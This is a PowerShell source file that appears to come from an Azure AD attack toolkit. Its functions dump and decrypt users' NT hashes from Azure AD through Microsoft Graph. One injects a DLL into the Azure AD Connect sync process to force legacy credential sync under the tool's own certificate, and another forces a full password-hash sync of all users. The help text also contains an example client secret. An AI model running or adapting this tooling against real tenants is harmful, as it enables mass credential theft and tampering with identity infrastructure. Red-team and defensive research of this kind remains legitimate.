
# Gets users NT Hashes from Azure AD
# Dec 22nd 2022
function Get-UserNTHash
{
<#
    .SYNOPSIS
    Exports and decrypts the NTHashes from Azure AD using the given application and certificate.

    .DESCRIPTION
    Exports and decrypts the NTHashes from Azure AD using the given application and certificate.

    The application must be "Azure AD Domain Services Sync" created during the Azure AD Domain services (AADDS) deployment. Either client certificate or password needs to be provided.

    The encryption certificate needs to be exported from AADDS domain controller.

    .Example
    PS C\:>Get-AADIntUserNTHash -ClientPassword "vlb8Q~W8iVXwfdt2FjIH4FE0hRc-p9G_kyN_KbtZ" -ClientId "23857e6f-7be4-4bb8-84b7-22e92c359c8d" -PfxFileName .\encryption_cert.pfx

    NTHash                           UserPrincipalName                  
    ------                           -----------------                  
    00000000000000000000000000000000 user1@company.com
    11111111111111111111111111111111 user2@company.com
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName='ClientPassword', Mandatory=$False)]
        [Parameter(ParameterSetName='ClientCert'    , Mandatory=$True)]
        [string]$ClientPfxFileName,
        [Parameter(ParameterSetName='ClientPassword', Mandatory=$True)]
        [Parameter(ParameterSetName='ClientCert'    , Mandatory=$False)]
        [string]$ClientPassword,
        [Parameter(Mandatory=$False)]
        [string]$ClientPfxPassword,
        [Parameter(Mandatory=$False)]
        [string]$PfxFileName,
        [Parameter(Mandatory=$False)]
        [string]$PfxPassword,
        [Parameter(Mandatory=$False)]
        [guid]$TenantId,
        [Parameter(Mandatory=$True)]
        [guid]$ClientId,
        [Parameter(Mandatory=$False)]
        [String]$UserPrincipalName,
        [Parameter(Mandatory=$False)]
        [switch]$UseBuiltInCertificate
    )
    Process
    {
        # Load certificates
        if(![string]::IsNullOrEmpty($ClientPfxFileName))
        {
            $clientCertificate = Load-Certificate -FileName $ClientPfxFileName -Password $ClientPfxPassword -Exportable
        }
        if($UseBuiltInCertificate)
        {
            $decryptionCertificate = Load-Certificate -FileName "$PSScriptRoot\ForceNTHash.pfx" -Exportable
        }
        elseif(![string]::IsNullOrEmpty($PfxFileName))
        {
            $decryptionCertificate = Load-Certificate -FileName $PfxFileName -Password $PfxPassword -Exportable
        }
        else
        {
            Throw "Provide PfxFileName or use -UseBuiltInCertificate"
        }

        # Parse the tenant name from the cert and get id if not provided
        if([string]::IsNullOrEmpty($TenantId))
        {
            try
            {
                $domainName = $decryptionCertificate.Subject.Split("-")[1].Trim()
                $TenantId = Get-TenantID -Domain $domainName
            }
            catch
            {
                throw "Unable to parse tenant id from the certificate. Try again with -Tenant switch."
            }
        }

        # Get access token
        $access_token = Get-DCaaSAccessToken -Certificate $clientCertificate -TenantId $TenantId -ClientId $ClientId -Password $ClientPassword
        
        $queryString = '$select=id,onPremisesImmutableId,onPremisesSecurityIdentifier,userPrincipalName,windowsLegacyCredentials'#,windowsSupplementalCredentials'
        if(![string]::IsNullOrEmpty($UserPrincipalName))
        {
            $queryString += "&`$filter=userPrincipalName eq '$UserPrincipalName'"
        }
        
        $results = Call-MSGraphAPI -AccessToken $access_token -API users -QueryString $queryString
        
        foreach($result in $results)
        {
            if($result.windowsLegacyCredentials)
            {
                $binLegacyCreds = Convert-B64ToByteArray -B64 $result.windowsLegacyCredentials
                $ADAuthInfo = Unprotect-ADAuthInfo -Data $binLegacyCreds -Certificate $decryptionCertificate
                if($ADAuthInfo)
                {
                    $binHash = $ADAuthInfo[8..($ADAuthInfo.length)]
                    [PSCustomObject][ordered]@{
                        "NTHash" = Convert-ByteArrayToHex -Bytes $binHash
                        "UserPrincipalName" = $result.UserPrincipalName
                    }
                }
                else
                {
                    Write-Verbose "Decryption failed: $($result.UserPrincipalName)"
                }
            }
            else
            {
                Write-Verbose "No NTHash:         $($result.UserPrincipalName)"
            }
        }
    }
}

# ForceNTHash functions

# Some constants
$AADConnectServiceName = "ADSync"
$AADConnectProcessName = "miiserver"

# Aug 21st 2023
function Install-ForceNTHash
{
<#
    .SYNOPSIS
    Installs ForceNTHash to the current computer.

    .DESCRIPTION
    Installs ForceNTHash to the current computer. 
    ForceNTHash enforces Windows legacy credential sync. Credentials are encrypted using ForceNTHash.pfx certificate.

    .EXAMPLE
    Install-AADIntForceNTHash
#>
    [cmdletbinding()]
    Param(
    [switch]$EnforceFullPasswordSync
    )
    Process
    {
        # Chech that running as administrator and that the service is running
        Test-LocalAdministrator -Throw | Out-Null

        $service = Get-Service -Name $AADConnectServiceName -ErrorAction SilentlyContinue
        if([String]::IsNullOrEmpty($service))
        {
            Write-Error "This command needs to be run on a computer with Azure AD Sync service (ADSync)"
            return
        }

        $promptValue = Read-Host "Are you sure you wan't to install ForceNTHash to this computer? Type YES to continue or CTRL+C to abort"
        if($promptValue -eq "yes")
        {
            # We need to restart so we can inject before GetWindowsCredentialsSyncConfig is called
            Restart-Service $AADConnectServiceName

            # But still wait a couple of seconds
            Write-Warning "Sleeping for five seconds.."
            Start-Sleep -Seconds 5

            # Get the process id
            $process = Get-Process -Name $AADConnectProcessName -ErrorAction SilentlyContinue
            $processId = $process.Id
            
            # Inject the dll
            $result=Inject-DLL -ProcessID $processID -FileName "$PSScriptRoot\ForceNTHash.dll" -Function "Patch"
            Write-Verbose "Inject-DLL result: $result"
            
            if($result -like "*success*")
            {
                Write-Host "Installation successfully completed!"
                Write-Host "Windows legacy credentials sync is now enforced and credentials are encrypted with ForceNTHash certificate."

                if($EnforceFullPasswordSync)
                {
                    Initialize-FullPasswordSync
                }

                return
            }
            else
            {
                Write-Error "Installation failed: $result"
                return
            }
        }
    }
}

# Aug 18th 2023
function Remove-ForceNTHash
{
<#
    .SYNOPSIS
    Removes ForceNTHash from the current computer

    .DESCRIPTION
    Removes ForceNTHash from the current computer by restarting ADSync service.

    .EXAMPLE
    Remove-AADIntForceNTHash

    WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to start...
    WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to start...
    WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to start...
    Service restarted and ForceNTHash removed.
#>
    [cmdletbinding()]
    Param()
    Process
    {
        $service = Get-Service -Name $AADConnectServiceName -ErrorAction SilentlyContinue
        if([String]::IsNullOrEmpty($service))
        {
            Write-Error "This command needs to be run on a computer with Azure AD Sync service (ADSync)"
            return
        }

        Restart-Service $AADConnectServiceName

        Write-Host "Service restarted and ForceNTHash removed."
    }
}


# Aug 21st 2023
function Initialize-FullPasswordSync
{
<#
    .SYNOPSIS
    Enforces password hash sync of all users.

    .DESCRIPTION
    Enforces password hash sync of all users.

    .EXAMPLE
    Initialize-AADIntFullPasswordSync
#>
    [cmdletbinding()]
    Param()
    Process
    {
        $service = Get-Service -Name $AADConnectServiceName -ErrorAction SilentlyContinue
        if([String]::IsNullOrEmpty($service))
        {
            Write-Error "This command needs to be run on a computer with Azure AD Sync service (ADSync)"
            return
        }

        # ref: https://learn.microsoft.com/en-us/azure/active-directory-domain-services/tutorial-configure-password-hash-sync

        Import-Module "$(Get-ItemPropertyValue "HKLM:\SOFTWARE\Microsoft\AD Sync"          -Name "Location"        )\Bin\ADSync\ADSync.psd1"
        Import-Module "$(Get-ItemPropertyValue "HKLM:\SOFTWARE\Microsoft\Azure AD Connect" -Name "InstallationPath")\AdSyncConfig\AdSyncConfig.psm1"

        $connectors = Get-ADSyncConnector

        if($connectors.Count -ne 2)
        {
            Throw "Connector count is not 2, can't automatically select connectors"
        }

        # Define the Azure AD Connect connector names and import the required PowerShell module
        $azureadConnector = (Get-ADSyncConnector | where Type -ne "AD").Name
        $adConnector      = (Get-ADSyncConnector | where Type -eq "AD").Name

        # Create a new ForceFullPasswordSync configuration parameter object then
        # update the existing connector with this new configuration
        $c = Get-ADSyncConnector -Name $adConnector
        $p = New-Object Microsoft.IdentityManagement.PowerShell.ObjectModel.ConfigurationParameter "Microsoft.Synchronize.ForceFullPasswordSync", String, ConnectorGlobal, $null, $null, $null
        $p.Value = 1
        $c.GlobalParameters.Remove($p.Name) | Out-Null
        $c.GlobalParameters.Add($p)         | Out-Null
        $c = Add-ADSyncConnector -Connector $c

        # Disable and re-enable Azure AD Connect to force a full password synchronization
        Set-ADSyncAADPasswordSyncConfiguration -SourceConnector $adConnector -TargetConnector $azureadConnector -Enable $false | Out-Null
        Set-ADSyncAADPasswordSyncConfiguration -SourceConnector $adConnector -TargetConnector $azureadConnector -Enable $true  | Out-Null

        Write-Host "Full password sync enforced"
               
    }
}